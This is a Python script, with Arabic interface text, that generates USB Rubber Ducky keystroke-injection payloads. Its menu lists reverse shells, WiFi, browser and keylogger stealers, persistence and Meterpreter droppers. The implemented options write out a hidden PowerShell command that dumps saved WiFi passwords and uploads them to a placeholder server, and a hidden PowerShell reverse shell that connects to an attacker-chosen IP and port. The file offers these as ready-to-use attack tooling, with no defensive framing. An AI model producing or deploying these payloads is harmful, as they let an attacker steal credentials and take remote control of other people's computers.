#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Rubber Ducky Payload Generator

import os
from colorama import init, Fore, Style
from banner import show_banner

init(autoreset=True)

class RubberDuckyGenerator:
    def __init__(self):
        self.name = "Rubber Ducky Generator"
    
    def show_menu(self):
        menu = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════╗
║     🦆  Rubber Ducky Payload Generator      ║
╠══════════════════════════════════════════════╣
║                                              ║
║  {Fore.WHITE}[1] {Fore.GREEN}Reverse Shell (Windows)             {Fore.YELLOW}║
║  {Fore.WHITE}[2] {Fore.GREEN}Reverse Shell (Linux/Mac)           {Fore.YELLOW}║
║  {Fore.WHITE}[3] {Fore.GREEN}WiFi Password Stealer               {Fore.YELLOW}║
║  {Fore.WHITE}[4] {Fore.GREEN}Keylogger Installation               {Fore.YELLOW}║
║  {Fore.WHITE}[5] {Fore.GREEN}Browser Data Stealer                 {Fore.YELLOW}║
║  {Fore.WHITE}[6] {Fore.GREEN}Persistence Installer                {Fore.YELLOW}║
║  {Fore.WHITE}[7] {Fore.GREEN}System Info Collector                {Fore.YELLOW}║
║  {Fore.WHITE}[8] {Fore.GREEN}Meterpreter Payload Dropper          {Fore.YELLOW}║
║  {Fore.WHITE}[9] {Fore.GREEN}Custom Ducky Script                  {Fore.YELLOW}║
║                                              ║
║  {Fore.RED}[0] {Fore.RED}العودة للقائمة الرئيسية            {Fore.YELLOW}║
║                                              ║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)
    
    def generate_wifi_stealer(self):
        """توليد سكريبت سرقة كلمات WiFi"""
        script = """REM Camorro - WiFi Password Stealer
DEFAULTDELAY 50
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$profiles=netsh wlan show profiles|Select-String ': '|%%{$_.ToString().Split(':')[1].Trim()};foreach($p in $profiles){$k=netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content';if($k){$p+':'+$k.ToString().Split(':')[2].Trim()}|Out-File -FilePath $env:TEMP\\wifi_pass.txt -Append};$wc=New-Object System.Net.WebClient;$wc.UploadFile('http://YOUR_SERVER/upload','$env:TEMP\\wifi_pass.txt')"
ENTER
"""
        with open("ducky_wifi_stealer.txt", "w") as f:
            f.write(script)
        print(f"{Fore.GREEN}[+] تم توليد سكريبت سرقة WiFi: ducky_wifi_stealer.txt{Style.RESET_ALL}")
    
    def generate_powershell_reverse(self, ip, port):
        """توليد Reverse Shell للـ Ducky"""
        script = f"""REM Camorro - PowerShell Reverse Shell
DEFAULTDELAY 50
DELAY 2000
CTRL ESC
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()}};$c.Close()"
ENTER
"""
        with open(f"ducky_ps_reverse_{port}.txt", "w") as f:
            f.write(script)
        print(f"{Fore.GREEN}[+] تم توليد السكريبت: ducky_ps_reverse_{port}.txt{Style.RESET_ALL}")
    
    def run(self):
        show_banner("ducky")
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.GREEN}╰➤ {Fore.YELLOW}اختر [0-9]: {Style.RESET_ALL}")
            
            if choice == "0":
                break
            elif choice == "1":
                ip = input(f"{Fore.WHITE}[?] IP المستمع: {Style.RESET_ALL}").strip()
                port = input(f"{Fore.WHITE}[?] المنفذ: {Style.RESET_ALL}").strip()
                if ip and port:
                    self.generate_powershell_reverse(ip, port)
            elif choice == "3":
                self.generate_wifi_stealer()
            else:
                print(f"{Fore.YELLOW}[!] قيد التطوير... قريباً!{Style.RESET_ALL}")
